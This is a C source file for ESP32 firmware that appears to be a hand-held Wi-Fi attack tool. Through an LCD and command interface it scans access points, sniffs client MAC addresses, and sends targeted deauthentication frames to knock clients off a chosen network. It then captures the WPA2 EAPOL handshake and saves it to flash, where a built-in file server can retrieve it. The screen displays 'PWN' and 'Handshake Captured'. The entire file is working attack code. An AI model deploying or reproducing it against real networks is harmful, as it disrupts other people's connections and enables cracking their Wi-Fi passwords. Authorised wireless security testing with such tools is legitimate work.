#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <dirent.h>

#include "esp_system.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_timer.h"
#include "esp_mac.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "wifi.h"
#include "user_interface.h"
#include "wsl_bypasser.h"
#include "tcp_file_server.h"
#include "pkt_sniffer.h"

#define TIMER_DELAY_MS 1000
#define DEFAULT_SCAN_LIST_SIZE 16


#define MAX_SSID_LEN 32
#define MOUNT_PATH "/spiffs"

static const char* TAG = "WIFI";

// Maintain a list of APs in order of RSSI
static wifi_ap_record_t ap_info[sizeof(wifi_ap_record_t) * DEFAULT_SCAN_LIST_SIZE];
static uint16_t ap_count = 0;


static int8_t active_mac_target_ap = -1;


// We maintain a single timer to be used as a "poll n dump" function ie every
// TIMER_DELAY_MS milliseconds execute a function that usually polls and sends
// data to the serial console or the lcd
static esp_timer_handle_t gp_timer;
static esp_timer_create_args_t gp_timer_args = 
{
    .callback = NULL,
    .name = "Wifi GP Timer"
};
static uint8_t gp_timer_running = 0;

int8_t client_id = -1;
uint8_t client_mac[MAC_LEN];

//*****************************************************************************
// Wifi Event Loop Handler -> Handles action at the AP/STA level with regards
// to the client. We also have the functions for starting and stopping the 
// SoC AP
//*****************************************************************************

static void wifi_event_handler(void* arg, esp_event_base_t event_base,
                                    int32_t event_id, void* event_data)
{
    if (event_id == WIFI_EVENT_AP_STACONNECTED) 
    {
        wifi_event_ap_staconnected_t* event = (wifi_event_ap_staconnected_t*) event_data;
        

        client_id = event->aid;
        memcpy(client_mac, event->mac, MAC_LEN);
        ESP_LOGI(TAG, "In wifi event handler - station "MACSTR" with id=%d connected to SoC AP", MAC2STR(client_mac), client_id);

        ESP_ERROR_CHECK_WITHOUT_ABORT(tcp_file_server_launch(MOUNT_PATH));
        
    } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) 
    {
        wifi_event_ap_stadisconnected_t* event = (wifi_event_ap_stadisconnected_t*) event_data;
        ESP_LOGI(TAG, "In wifi event handler - station "MACSTR" Diconnect Event, AID=%d", MAC2STR(event->mac), event->aid);

        // Just need to trigger the client handler task to clean up its shit
        ESP_ERROR_CHECK_WITHOUT_ABORT(tcp_file_server_kill());
        client_id = -1;
        memset(client_mac, 0, MAC_LEN);
    }
    else
    {
        ESP_LOGI(TAG, "Unhandled WIFI event");
    }
}

//*****************************************************************************
// Client STA handler code
//*****************************************************************************

static void deauth_client(void)
{
    ESP_ERROR_CHECK(esp_wifi_deauth_sta(client_id));
        ESP_LOGI(TAG, "station "MACSTR" kicked, AID = %d", MAC2STR(client_mac), client_id);  
}

//*****************************************************************************
// General Purpose Timer - We provide this as a quick way for UI and REPL cmds
// to register polling output to their respective medium.
//*****************************************************************************

static void gp_timer_create_n_start(void* fp)
{
    if(gp_timer_running)
    {
        ESP_LOGE(TAG, "GP Timer started when already running");
        return;
    }

    gp_timer_args.callback = fp;
    ESP_ERROR_CHECK(esp_timer_create(&gp_timer_args, &gp_timer));
    ESP_ERROR_CHECK(esp_timer_start_periodic(gp_timer, TIMER_DELAY_MS*1000));
    gp_timer_running = 1;

    ESP_LOGI(TAG, "GP Timer started");
}

static void gp_timer_stop_n_destroy(void)
{
    if(!gp_timer_running)
    {
        ESP_LOGE(TAG, "GP Timer stoped when not running");
        return;
    }

    ESP_ERROR_CHECK(esp_timer_stop(gp_timer));
    ESP_ERROR_CHECK(esp_timer_delete(gp_timer));
    gp_timer_running = 0;

    ESP_LOGI(TAG, "GP Timer Stopped");
}

static void clear_active_mac_list(void)
{
    if(!xSemaphoreTake(active_mac_list_lock, 0))
    {
        ESP_LOGI(TAG, "clear mac list failed ..  busy");
        return;
    }

    if(eapol_pkts_captured == EAPOL_NUM_PKTS && eapol_pkts_written_out == 0)
    {
        eapol_dump_to_disk();
    }

    active_mac_list_len = 0;
    active_mac_target_ap = -1;
    eapol_pkts_captured = 0;
    eapol_pkts_written_out = 0;
    eapol_pkt_lens[0] = 0;
    eapol_pkt_lens[1] = 0;
    eapol_pkt_lens[2] = 0;
    eapol_pkt_lens[3] = 0;
    eapol_pkt_lens[4] = 0;
    eapol_pkt_lens[5] = 0;
    assert(xSemaphoreGive(active_mac_list_lock) == pdTRUE);
    ESP_LOGI(TAG, "Active MAC List Cleared");
}

//*****************************************************************************
// PKT Sniffer Code
//*****************************************************************************

static void set_active_mac_ap_target(uint8_t ap_index)
{
    if(ap_index >= ap_count )
    {
        ESP_LOGE(TAG, "TRIED to set STA scan target to AP outside of range");
        return;
    }

    ESP_LOGI(TAG, "Active Mac Scan AP target set to %s", ap_info[ap_index].ssid);
    active_mac_target_ap = ap_index;

}


static void _cb(wifi_promiscuous_pkt_t* p, 
                wifi_promiscuous_pkt_type_t type, 
                WPA2_Handshake_Index_t eapol)
{
    uint8_t* src = p->payload + 10;

    insert_mac(src, p->rx_ctrl.rssi);

    if(eapol == HS_NONE)
    {
        return;
    }

    uint16_t len = p->rx_ctrl.sig_len;
    uint8_t num = (int) eapol; 

    ESP_LOGI(TAG, "%s -- Recovered WPA2 (%d)", ap_info[active_mac_target_ap].ssid, num);

    if(!xSemaphoreTake(eapol_lock, EAPOl_SEMA_TIMEOUT_MS / portTICK_PERIOD_MS))
    {
        ESP_LOGE(TAG, "BAD VERY BAD .. EAPOL lock time out on handshake pkt %d ... dropping pkt", num);
        return;
    }

    if(len >= EAPOL_MAX_PKT_LEN)
    {
        ESP_LOGE(TAG, "ERROR EAPOL packet too long");
        assert(xSemaphoreGive(eapol_lock));
    }

    if(eapol_pkt_lens[num] == 0)
    {
        eapol_pkt_lens[num] = len;
        memcpy(eapol_buffer + EAPOL_MAX_PKT_LEN*num, p->payload, len);
        ++eapol_pkts_captured;
    }
    else
    {
        ESP_LOGI(TAG, "Recieved a duplicate eapol pkt %d - possibly observed partial handshake", num);
    }

    if(eapol_pkts_captured == EAPOL_NUM_PKTS && eapol_pkts_written_out == 0)
    {
        eapol_dump_to_disk();
    }

    assert(xSemaphoreGive(eapol_lock));
    
}

static void launch_pkt_sniffer()
{
    if(pkt_sniffer_is_running())
    {
        ESP_LOGE(TAG, "Called launch_pkt_sniffer when already running");
        return;
    }

    if(active_mac_target_ap == -1)
    {
        ESP_LOGE(TAG, "Called launch_pkt_sniffer without setting an active MAC AP target");
        return;
    }

    if(client_id !=-1)
    {
        ESP_LOGI(TAG, "In launch_pkt_sniffer - deauthing client");
        deauth_client();
    }

    ESP_ERROR_CHECK(pkt_sniffer_clear_filter_list());

    pkt_sniffer_filtered_cb_t filt_cb = {0};

    filt_cb.ap_active = 1;
    memcpy(filt_cb.ap, ap_info[active_mac_target_ap].bssid, 6);
    filt_cb.cb = _cb;

    ESP_ERROR_CHECK_WITHOUT_ABORT(pkt_sniffer_add_filter(&filt_cb));

    wifi_promiscuous_filter_t filt = 
    {
        .filter_mask=WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT
    };

    ESP_ERROR_CHECK(pkt_sniffer_launch(ap_info[active_mac_target_ap].primary, filt));
}

static void kill_pkt_sniffer(void)
{
    if(!pkt_sniffer_is_running())
    {
        ESP_LOGE(TAG, "Called kill_pkt_sniffer when not running");
        return;
    }

    ESP_ERROR_CHECK(pkt_sniffer_kill());
    ESP_ERROR_CHECK(pkt_sniffer_clear_filter_list());
}

//*****************************************************************************
// REPL SCAN AP CMD
//*****************************************************************************

int do_repl_scan_ap(int argc, char** argv)
{
    update_ap_info();

    int i;
    for(i = 0; i < ap_count; ++i)
    {
        printf("%d - SSID=%-19s   BSSID=%02x:%02x:%02x:%02x:%02x:%02x   Channel=%02d   RSSI=%03d\n", i, ap_info[i].ssid, ap_info[i].bssid[0],ap_info[i].bssid[1],ap_info[i].bssid[2],ap_info[i].bssid[3],ap_info[i].bssid[4],ap_info[i].bssid[5], ap_info[i].primary, ap_info[i].rssi);
    }

    return 0;
}

//*****************************************************************************
// REPL SCAN MAC CMD
//*****************************************************************************

static void repl_scan_mac_time_cb(void* arg)
{
    uint8_t i;
    for(i = 0; i < active_mac_list_len; ++i)
    {
        uint8_t* m1 = get_nth_mac(i);
        printf("MAC %d = %02x:%02x:%02x:%02x:%02x:%02x   RSSI=%03d\n", i, m1[0], m1[1], m1[2], m1[3], m1[4], m1[5], get_nth_rssi(i));
    }
    printf("\n");

} 

int do_repl_scan_mac_start(int argc, char** argv)
{
    if(argc != 2)
    {
        ESP_LOGE(TAG, "Usage: scan_mac_start <ssid index>");
        return 1;
    }

    if(ap_count == 0)
    {
        ESP_LOGE(TAG, "Please run an AP scan or get to area with APs");
        return 1;
    }

    set_active_mac_ap_target( (uint8_t) strtol(argv[1], NULL,10) );

    if(pkt_sniffer_is_running())
    {
        ESP_LOGE(TAG, "In do_repl_scan_mac_start - PKT Sniffer Already Running");
    }
    else
    {
        launch_pkt_sniffer();
    }

    if(gp_timer_running)
    {
        ESP_LOGE(TAG, "In do_repl_scan_mac_start - GP Timer in use");
    }
    else
    {
        gp_timer_create_n_start(&repl_scan_mac_time_cb);
    }

    return 0;
}

int do_repl_scan_mac_stop(int argc, char** argv)
{
    if(!gp_timer_running)
    {
        ESP_LOGE(TAG, "In do_repl_scan_mac_stop- GP timer already killed");
    }
    else
    {
        gp_timer_stop_n_destroy();
    }

    if(!pkt_sniffer_is_running())
    {
        ESP_LOGE(TAG, "In do_repl_scan_mac_stop - PKT Sniffer already killed");
    }
    else
    {
        kill_pkt_sniffer();
        clear_active_mac_list();
    }

    return 0;
}

//*****************************************************************************
// REPL Deauth STA CMD
//*****************************************************************************

int do_deauth(int argc, char** argv)
{  
    if(argc != 2)
    {
        ESP_LOGE(TAG, "Usage: deauth <mac index>");
        return 1;
    }

    if(!pkt_sniffer_is_running())
    {
        ESP_LOGE(TAG, "Please run the pkt sniffer first");
        return 1;
    }

    uint8_t i = (uint8_t) strtol(argv[1], NULL,10);
    ESP_ERROR_CHECK(wsl_bypasser_send_deauth_frame_targted(ap_info[active_mac_target_ap].bssid, (uint8_t*) &active_mac_list[i]));
    ESP_LOGI(TAG, "DEAUTH SENT AP=%s STA="MACSTR, ap_info[active_mac_target_ap].bssid, MAC2STR((uint8_t*) &active_mac_list[i]));

    return 0;
}

//*****************************************************************************
// UI SCAN AP. Pretty straightforward lcd UI command. On init of this cmd we
// home the screen, clear it and put an indicator that we are scanning. And 
// lock the cursor cause we dont want anyone messing around. We then push the
// AP info to the buff, unlock cursor and return. Nothing to do for button cb
// or fini.
//*****************************************************************************

void lcd_dump_ap(uint8_t i, uint8_t* line_counter)
{
    char line_buff[20] = {0};

    strncpy(line_buff, (char*) ap_info[i].ssid, 19);
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(*line_counter, line_buff));
    (*line_counter)++;

    snprintf(line_buff,19, "%02x:%02x:%02x:%02x:%02x:%02x", ap_info[i].bssid[0],ap_info[i].bssid[1],ap_info[i].bssid[2],ap_info[i].bssid[3],ap_info[i].bssid[4],ap_info[i].bssid[5]);
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(*line_counter, line_buff));
    (*line_counter)++;

    snprintf(line_buff,19, "Channel=%02d", ap_info[i].primary);
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(*line_counter, line_buff));
    (*line_counter)++;

    snprintf(line_buff,19, "RSSI=%03d", ap_info[i].rssi);
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(*line_counter, line_buff));
    (*line_counter)++;

    line_buff[0] = ' ';
    line_buff[1] = (char) 0;
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(*line_counter, line_buff));
    (*line_counter)++;
}

void ui_scan_ap_cb(uint8_t i)
{
    ESP_LOGI(TAG, "UI SCAN AP CMD CB");
}

void ui_scan_ap_fini(void)
{
    ESP_LOGI(TAG, "UI SCAN AP CMD FINI");
}

void ui_scan_ap_ini(void)
{
    ESP_LOGI(TAG, "UI SCAN AP CMD INI");

    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_lock_cursor());
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_home_screen_pos());
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(0, "Scanning..."));
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(1, ""));
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(2, ""));
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(3, ""));
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_update_display());
    update_ap_info();

    uint8_t i;
    uint8_t line_counter = 0;
    for(i = 0; i < ap_count; ++i)
    {
        lcd_dump_ap(i, &line_counter);   // puts in line buffer
    }

    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_unlock_cursor());
    
    return;   // updates display upon return
}

//*****************************************************************************
// STA Scanner LCD UI APP - On init it starts scanning for MACs, periodically
// updating the screen with number of MACS found. Pressing the button stops the
// scanning and presents the list of MACS and an option to go back to scanning.
// If the index is a MAC, then we start scanning only that STA, reporting the
// rssi. A single press on this screen brings you back to num macs scanning and
// does not clear the set of MACs found.
//*****************************************************************************

static uint8_t report_num_macs_timer_running = 0;
static uint8_t selecting_target_mac = 0;
static uint8_t report_rssi_timer_running = 0;
static uint8_t target_mac = 0;

static void report_num_macs_cb(void* args)
{   
    char line[20];
    snprintf(line, 19, "MACS Found = %03d", active_mac_list_len);
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(1, line));
    snprintf(line, 19, "EAPOL PKTS = %01d", eapol_pkts_captured);
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(2, line));
    if(eapol_pkts_written_out)
    {
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(3, "Handshake Captured"));
    }
    else
    {
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(3, ""));
    }

    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_update_display());
}

static void start_report_num_macs_timer(void)
{
    if(gp_timer_running)
    {
        ESP_LOGE(TAG, "In start_report_num_macs_timer - GP timer in use");
    }
    gp_timer_create_n_start(&report_num_macs_cb);
    report_num_macs_timer_running = 1;
}

static void stop_report_num_macs_timer(void)
{
    if(!gp_timer_running)
    {
        ESP_LOGE(TAG, "In stop_report_num_macs_timer - GP timer already killed");
    }

    gp_timer_stop_n_destroy();
    report_num_macs_timer_running = 0;
}

static void report_rssi_cb(void* args)
{   
    char line[20];
    snprintf(line, 19, "RSSI = %03d   ", get_nth_rssi(target_mac));
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(2, line));
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_update_line(2));
}

static void start_report_rssi_timer(void)
{
    if(gp_timer_running)
    {
        ESP_LOGE(TAG, "In start_report_rssi_timer - GP timer in use");
    }

    gp_timer_create_n_start(&report_rssi_cb);
    report_rssi_timer_running = 1;
}

static void stop_report_rssi_timer(void)
{
    if(!gp_timer_running)
    {
        ESP_LOGE(TAG, "In start_report_rssi_timer - GP timer already killed");
    }

    gp_timer_stop_n_destroy();
    report_rssi_timer_running = 0;
}

static void list_ssids_lcd(void)
{
    uint8_t i;
    char line_buff[20] = {0};
    for(i = 0; i < ap_count; ++i)
    {
        strncpy(line_buff, (char*) ap_info[i].ssid, 19);
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(i, line_buff));
    }
}

static void ui_scan_mac_fini(void) 
{
    ESP_LOGI(TAG, "UI SCAN MAC CMD FINI");

    if(report_num_macs_timer_running)
    {
        stop_report_num_macs_timer();
    }

    if(report_rssi_timer_running)
    {
        stop_report_rssi_timer();
    }

    selecting_target_mac = 0;

    if(!pkt_sniffer_is_running())
    {   
        ESP_LOGE(TAG, "In ui_scan_mac_fini - Pkt Sniffer Already Killed");
    }
    else
    {
        kill_pkt_sniffer();    
    }

    clear_active_mac_list();
}

static void ui_scan_mac_cb(uint8_t index)
{
    ESP_LOGI(TAG, "UI SCAN AP CMD CB");

    char line[20];

    if(!report_num_macs_timer_running && !selecting_target_mac && !report_rssi_timer_running)
    {
        if(index >= ap_count)
        {
            ESP_LOGE(TAG, "In Scan STA UI app, tried to set AP index out of range");
            ESP_ERROR_CHECK_WITHOUT_ABORT(ui_home_screen_pos());
            return;
        }

        set_active_mac_ap_target(index);

        if(pkt_sniffer_is_running())
        {
            ESP_LOGE(TAG, "In ui_scan_mac_cb - Pkt Sniffer already running");
        }
        else
        {
            launch_pkt_sniffer();
        }
        
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_lock_cursor());
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_home_screen_pos());
        strncpy(line, (char*) ap_info[active_mac_target_ap].ssid, 19);
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(0, line));
        snprintf(line, 19, "MACS Found = %03d", active_mac_list_len);
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(1, line));
        snprintf(line, 19, "EAPOL PKTS = %01d", eapol_pkts_captured);
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(2, line));
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(3, ""));
        
        
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_update_display());

        start_report_num_macs_timer();
        
        return;
    }

    if(report_num_macs_timer_running && !selecting_target_mac && !report_rssi_timer_running)
    {
        // The timer was running collecting MACS and reporting the number. On
        // button press we now show the MACS collected and wait for another
        // button click, selecting the MAC.

        // Try to grab the mac list lock cuz we dont want anyone messing with
        // it while we select an active mac. Will release it once we select a 
        // MAC

        if(!xSemaphoreTake(active_mac_list_lock, 10 / portTICK_PERIOD_MS))
        {
            ESP_LOGE(TAG, "In scan_sta_ui_cb, failed to grab lock ... busy");
            return;
        }

        if(active_mac_list_len == 0)
        {
            ESP_LOGI(TAG, "In scan sta ui cb, no moving to select mac state as non are avaible");
            assert(xSemaphoreGive(active_mac_list_lock));
            return;
        }


        stop_report_num_macs_timer();

        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_home_screen_pos());

        uint8_t i;
        for(i = 0; i < active_mac_list_len; ++i)
        {
            snprintf(line, 19, "%02x:%02x:%02x:%02x:%02x:%02x", get_nth_mac(i)[0], get_nth_mac(i)[1], get_nth_mac(i)[2],get_nth_mac(i)[3],get_nth_mac(i)[4],get_nth_mac(i)[5]);
            ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(i, line));
        }

        // If less then 4 macs, clear the rest of the screen
        for(;i<4;++i)
        {
            ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(i, ""));
        }

        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_update_display());
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_unlock_cursor());
        selecting_target_mac = 1;

        return;
    }
    
    if(!report_num_macs_timer_running && selecting_target_mac && !report_rssi_timer_running)
    {
        // Now index carries the MAC we which to do an RSSI scan on, check to
        // see if its in bounds, set up screen and timer and launch timer. Also
        // be sure to give the lock up

        if(index >= active_mac_list_len)
        {
            ESP_LOGE(TAG, "In scan sta ui cb selecting MAC out of range");
            return;
        }

        target_mac = index;
        selecting_target_mac = 0;
        assert(xSemaphoreGive(active_mac_list_lock) == pdTRUE);

        
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_lock_cursor());
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_home_screen_pos());
        strncpy(line, (char*) ap_info[active_mac_target_ap].ssid, 19);
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(0, line));
        snprintf(line, 19, MACSTR, MAC2STR(get_nth_mac(target_mac)));
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(1, line));
        snprintf(line, 19, "RSSI = %03d   ", get_nth_rssi(target_mac));
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(2, line));
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(3, "-----> PWN <------"));
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_update_display());

        start_report_rssi_timer();

        return;
    }

    if(!report_num_macs_timer_running && !selecting_target_mac && report_rssi_timer_running)
    {
        // This cancels our rssi timer and should bring us back to report num
        // mac state. Kill the report rssi timer, reset screen and launch the
        // num macs timers

        // Also here is where we send the deauth pkt

        stop_report_rssi_timer();

        ESP_ERROR_CHECK_WITHOUT_ABORT(wsl_bypasser_send_deauth_frame_targted(ap_info[active_mac_target_ap].bssid, (uint8_t*) &active_mac_list[target_mac]));
        ESP_LOGI(TAG, "DEAUTH SENT AP=%s STA="MACSTR, ap_info[active_mac_target_ap].bssid, MAC2STR((uint8_t*) &active_mac_list[target_mac]));

        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_lock_cursor());
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_home_screen_pos());
        strncpy(line, (char*) ap_info[active_mac_target_ap].ssid, 19);
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(0, line));
        snprintf(line, 19, "MACS Found = %03d", active_mac_list_len);
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(1, line));
        snprintf(line, 19, "EAPOL PKTS = %01d", eapol_pkts_captured);
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(2, line));
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(3, ""));
        ESP_ERROR_CHECK_WITHOUT_ABORT(ui_update_display());

        start_report_num_macs_timer();
        
        return;
    }
}

static void ui_scan_mac_ini(void)
{
    ESP_LOGI(TAG, "UI SCAN AP CMD INI");

    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_lock_cursor());
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_home_screen_pos());
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(0, "Scanning APs..."));
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(1, ""));
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(2, ""));
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_push_to_line_buffer(3, ""));
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_update_display());
    update_ap_info();
    list_ssids_lcd();
    ESP_ERROR_CHECK_WITHOUT_ABORT(ui_unlock_cursor());
}

//*****************************************************************************
// PUBLIC
//*****************************************************************************

